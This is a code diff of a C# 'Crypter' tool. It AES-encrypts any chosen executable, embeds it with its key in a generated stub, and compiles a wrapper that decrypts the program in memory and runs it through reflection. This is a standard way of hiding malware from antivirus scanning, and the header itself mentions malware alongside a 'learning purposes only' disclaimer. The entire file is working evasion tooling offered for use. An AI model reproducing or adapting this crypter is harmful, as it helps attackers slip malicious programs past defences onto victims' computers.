@@ -1,13 +1,27 @@
 ﻿/* Crypter
- * Copyright (C) 2019  henkje (henkje@pm.me)
  * 
- * MIT license
+ * Copyright (c) 2019 henkje
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+ *
  * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+ * 
+ *        -https://github.com/GHenkje/EasyEncrypt/blob/master/LICENSE-
+ *          
+ * !!!!!!!!!!!Spreading malware is against the law!!!!!!!!!!!
+ * !!!!!!!!!!!!This is for learning purposes only!!!!!!!!!!!!
  */
 
 using System;
@@ -17,15 +31,16 @@ using System.Text;
 using EasyEncrypt;
 using Microsoft.CSharp;
 using System.Windows.Forms;
-using System.Security.Cryptography;
 using System.CodeDom.Compiler;
+using System.Security.Cryptography;
 
 namespace Crypter
 {
     public partial class Crypter : Form
     {
-        const string CODE =
+        const string StubCode =
 @"
+using System;
 using System.IO;
 using System.Reflection;
 using System.Security.Cryptography;
@@ -34,95 +49,122 @@ namespace NaMeSpAcE
 {
     class Program
     {
-            static void Main()
+        private static byte[] programBytes = ___PROGRAM___;//Encrypted bytes of invoked program.
+        private static byte[] key = ___KEY___;//Key used to encrypt the program.
+
+        static void Main()
+        {
+            ExecuteBytes(GetBytes());
+        }
+
+        /// <summary>
+        /// Decrypt and return the bytes of the invoked program.
+        /// </summary>
+        /// <returns>The bytes of the program</returns>
+        static byte[] GetBytes()
+        {
+            using (Aes algorithm = Aes.Create())//Create algorithm.
+            using (MemoryStream ms = new MemoryStream(programBytes))//Create memory stream with program bytes.
             {
-                byte[] ProgramBytes = GetBytes();//Get the bytes from the program
-                ExecuteBytes(ProgramBytes);//Execute the bytes
-            }
+                byte[] IV = new byte[algorithm.IV.Length];
+                ms.Read(IV, 0, IV.Length);//Get IV from ms. (first 16 bytes)
 
-            static void ExecuteBytes(byte[] Data)
-            {
-                //Create assembly of the Data.
-                Assembly Assembly = Assembly.Load(Data);
-
-                //Get the entry point of the program.
-                MethodInfo method = Assembly.EntryPoint;
-
-                //Run the application from starting point.
-                method.Invoke(Assembly.CreateInstance(method.Name), null);
-            }
-
-            static byte[] GetBytes()
-            {
-                Aes Provider = Aes.Create();//Create algorithm
-                Provider.Key = ___KEY___;//Set encryption key
-
-                using (MemoryStream ms = new MemoryStream(___PROGRAM___))//Create memory stream with program bytes
+                using (CryptoStream cs = new CryptoStream(ms, algorithm.CreateDecryptor(key, IV), CryptoStreamMode.Read))
                 {
-                    byte[] IV = new byte[Provider.IV.Length];
-                    ms.Read(IV, 0, IV.Length);//Get IV from ms(first 16 bytes)
-                    Provider.IV = IV;//Add IV to Algorithm
+                    byte[] decrypted = new byte[ms.Length];
+                    int byteCount = cs.Read(decrypted, 0, (int)ms.Length);
 
-                    using (CryptoStream cs = new CryptoStream(ms, Provider.CreateDecryptor(Provider.Key, Provider.IV), CryptoStreamMode.Read))
-                    {
-                        byte[] Decrypted = new byte[ms.Length];
-                        int byteCount = cs.Read(Decrypted, 0, (int)ms.Length);
-                        return new MemoryStream(Decrypted, 0, byteCount).ToArray();
-                    }
+                    byte[] decryptedData = new byte[byteCount];
+                    Buffer.BlockCopy(decrypted, 0, decryptedData, 0, byteCount);
+                    return decryptedData;
                 }
             }
         }
+
+        /// <summary>
+        /// Invoke the bytes of the program into the stub.
+        /// </summary>
+        /// <param name=""Data"">Bytes of the invoked program</param>
+        static void ExecuteBytes(byte[] Data)
+        {
+            //Create assembly of the Data.
+            Assembly Assembly = Assembly.Load(Data);
+
+            //Get the entry point of the program.
+            MethodInfo method = Assembly.EntryPoint;
+
+            //Run the application from starting point.
+            method.Invoke(Assembly.CreateInstance(method.Name), null);
+        }
     }
+}
 ";
 
         public Crypter()=> InitializeComponent();
 
-        private void build_Click(object sender, EventArgs e)
+        private void Build_Click(object sender, EventArgs e)
         {
-            if (!File.Exists(path.Text)) { MessageBox.Show("No file selected."); return; }
-
-            SaveFileDialog SaveFileDialog = new SaveFileDialog() { Filter = "Executable files (*.exe)|*.exe" };
-
-            if (SaveFileDialog.ShowDialog() == DialogResult.OK)
+            if (!File.Exists(path.Text))
             {
-                //Set up the compiler.
-                CSharpCodeProvider csc = new CSharpCodeProvider();
-                CompilerParameters Parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" }, SaveFileDialog.FileName) { GenerateExecutable = true };
-                if (winexe.Checked) Parameters.CompilerOptions = "/target:winexe";
+                MessageBox.Show("No file selected.");
+                return;
+            }
 
-                //Set up the code.
-                string Code = CODE;
+            using (SaveFileDialog saveFileDialog = new SaveFileDialog() { Filter = "Executable files (*.exe)|*.exe" })
+            {
+                if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    /*                                                          Set up the compiler.                                                          */
+                    CSharpCodeProvider csc = new CSharpCodeProvider();
+                    CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" }, saveFileDialog.FileName) { GenerateExecutable = true };
+                    if (winexe.Checked)
+                        parameters.CompilerOptions = "/target:winexe";
 
-                byte[] EncryptionKey = Aes.Create().Key;
-                Code = Code.Replace("___KEY___", ByteArrayToString(EncryptionKey));
+                    /*                                                          Set up the code.                                                          */
+                    string code = StubCode;
 
-                byte[] ProgramBytes = File.ReadAllBytes(path.Text);
-                byte[] EncryptedProgramBytes = new Encryption(Aes.Create(), EncryptionKey).Encrypt(ProgramBytes);
+                    byte[] encryptionKey = Aes.Create().Key;
+                    code = code.Replace("___KEY___", ByteArrayToString(encryptionKey));
 
-                Code = Code.Replace("___PROGRAM___", ByteArrayToString(EncryptedProgramBytes));
+                    byte[] programBytes = File.ReadAllBytes(path.Text);
+                    byte[] encryptedProgramBytes = new Encryption(Aes.Create(), encryptionKey).Encrypt(programBytes);
 
-                CompilerResults Results = csc.CompileAssemblyFromSource(Parameters, Code);
-                Results.Errors.Cast<CompilerError>().ToList().ForEach(Error => MessageBox.Show(Error.ErrorText));
+                    code = code.Replace("___PROGRAM___", ByteArrayToString(encryptedProgramBytes));
+
+                    /*                                                          Compile the code.                                                          */
+                    CompilerResults Results = csc.CompileAssemblyFromSource(parameters, code);
+                    Results.Errors.Cast<CompilerError>().ToList().ForEach(Error => MessageBox.Show(Error.ErrorText));//Display errors.
+                }
             }
         }
 
-        private string ByteArrayToString(byte[] Array)
-        {
-            StringBuilder Builder = new StringBuilder();
-            Builder.Append("new byte[] {");
-            foreach (byte b in Array)
-            {
-                Builder.Append(b);
-                Builder.Append(',');
-            }
-            Builder.Append("}");
-            return Builder.ToString();           
-        }
-
-        private void search_Click(object sender, EventArgs e)
+        private void Search_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog OpenFileDialog1 = new OpenFileDialog())
-                if (OpenFileDialog1.ShowDialog() == DialogResult.OK) path.Text = OpenFileDialog1.FileName;
+                if (OpenFileDialog1.ShowDialog() == DialogResult.OK)
+                    path.Text = OpenFileDialog1.FileName;
+        }
+
+        /// <summary>
+        /// Converts a byte[] into code format: "new byte[]{12,54,12}"
+        /// </summary>
+        /// <param name="Array"></param>
+        /// <returns>byte[] in code format</returns>
+        private string ByteArrayToString(byte[] Array)
+        {
+            StringBuilder builder = new StringBuilder();
+            builder.Append("new byte[] {");
+
+            foreach (byte b in Array)
+            {
+                builder.Append(b);
+                builder.Append(',');
+            }
+
+            builder.Length -= 1;//Remove last ','
+            builder.Append("}");
+
+            return builder.ToString();
         }
     }
 }
